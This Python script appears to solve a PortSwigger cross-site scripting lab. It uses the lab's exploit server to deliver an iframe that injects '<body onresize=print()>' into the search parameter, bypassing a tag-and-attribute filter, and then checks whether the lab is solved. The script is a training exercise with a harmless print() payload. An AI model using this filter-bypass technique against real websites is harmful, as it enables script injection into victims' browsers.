#Port Swigger Lab : Most Elements and Attributes blocked.

import requests
import urllib3
import sys
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080/', 'https' : 'http://127.0.0.1:8080/'}


def find_server(text):
    soup = BeautifulSoup(text, 'html.parser')
    res = soup.find('a', attrs={'id' : 'exploit-link'})['href']
    return res


def exploit(client, exploit_server, lab_server):
    data = {'UrlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': '''HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8''',
            'responseBody': '''<iframe src="''' + lab_server + '''/?search=<body onresize=print()>" onload=this.style.width='100px'>''',
            'formAction': 'DELIVER_TO_VICTIM'
        }
    return client.post(exploit_server, data=data).status_code == 200



def main() :
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage : {sys.argv[0]} <host>')
        print(f'Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)
    
    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    exploit_server = find_server(client.get(host).text)

    print(f'Exploit Server : {exploit_server}')

    if not exploit(client, exploit_server, host):
        print(f'[-] Failed')
        sys.exit(-1)
    print(f'Successfully delivered')

    if 'Congratulations, you solved the lab!' not in client.get(host).text:
        print(f'[-] Failed to solve')
        sys.exit(-1)

    print(f'[+] Solved')


if __name__ == "__main__":
    main()
